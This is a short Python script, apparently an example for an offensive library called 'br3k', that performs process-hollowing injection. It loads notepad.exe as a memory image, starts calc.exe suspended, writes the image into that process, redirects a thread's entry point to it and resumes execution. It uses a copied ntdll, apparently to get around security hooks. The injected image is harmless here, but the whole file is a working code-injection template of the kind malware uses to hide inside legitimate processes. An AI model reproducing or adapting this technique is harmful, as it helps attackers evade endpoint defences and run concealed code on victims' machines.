import br3k
from br3k import ProcessMemoryStrategy

if __name__ == "__main__":

    print("Script: Inject via process hollowing")
    print()

    br3k.init_sysapi(ntdll_copy=True)

    image = br3k.FileMapping("C:\\Windows\\System32\\notepad.exe")
    pe = br3k.Pe(
        data=image.data,
        size=image.size,
        is_file = True
    )
    mem_image = pe.build_mem_image()

    process = br3k.Process(
        image_path="C:\\Windows\\System32\\calc.exe",
        memory_strategy=ProcessMemoryStrategy.AllocateInAddr
    )
    process.create_user(suspended=True)
    process.init_memory()
    process.create_memory(size=len(mem_image))
    ep = process.get_memory_remote_address()
    process.write_mem_image(mem_image)

    process.set_thread_ep(new_thread=True, ep=ep)
    process.resume_thread()

    br3k.script_success()
